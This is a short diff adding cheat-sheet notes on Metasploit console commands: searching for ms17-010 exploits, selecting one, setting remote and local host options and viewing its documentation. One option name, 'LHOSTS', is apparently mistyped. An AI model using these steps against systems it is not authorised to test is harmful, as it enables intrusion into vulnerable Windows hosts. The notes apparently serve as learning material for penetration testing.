@@ -1,0 +1,16 @@
+    
+
+
+
+msfconsole:   start Metasploit
+search ms17-010 :   find ms17-010 related exploits
+ 
+
+use 0 : To use an exploit, simply type   the number of the exploit in the table.
+show options
+
+set RHOSTS <ip>    set remote host ip
+
+set LHOSTS <ip>
+
+info -d : look at the exploit documentation 
